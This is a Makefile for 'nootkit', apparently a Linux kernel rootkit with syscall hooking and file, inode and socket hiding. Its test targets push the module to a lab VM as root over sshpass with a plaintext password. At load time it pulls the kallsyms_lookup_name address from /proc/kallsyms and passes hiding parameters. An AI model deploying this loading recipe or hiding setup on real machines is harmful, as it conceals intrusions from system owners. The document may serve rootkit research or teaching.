KDIR := ${PWD}/kernel-headers/linux-headers-5.15.0-76-generic
obj-m := nootkit.o
nootkit-y := src/nootkit_main.o src/ksyms.o src/config.o
nootkit-y += src/hide/readdir.o src/hide/proc_net.o
nootkit-y += src/arch/x86_64/hook.o src/arch/x86_64/mm.o

ccflags-y := -I$(src)/src

TEST_IP := 192.168.122.122

default: build

build:
	make -C ${KDIR} M=${PWD} modules

clean:
	make -C ${KDIR} M=${PWD} clean

test-unload:
	-sshpass -pa ssh root@${TEST_IP} "rmmod nootkit"

test-load: build test-unload
	-sshpass -pa ssh root@${TEST_IP} "rm /nootkit.ko"
	sshpass -pa scp nootkit.ko root@${TEST_IP}:/
	sshpass -pa ssh root@${TEST_IP} \
	'insmod /nootkit.ko \
	kallsyms_lookup_name=0x$$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
	hide_filenames=hello,q \
	hide_inodes=138210,17635 \
	hide_sockets=PROTO=1\|LOCAL=1.2.3.4/16.16.16.16:53\|FOREIGN=4.5.6.7/255.255.255.255:13 \
	'

test-hello: test-load
	sshpass -pa ssh root@${TEST_IP} "journalctl -kS -10sec"

test: test-hello test-unload
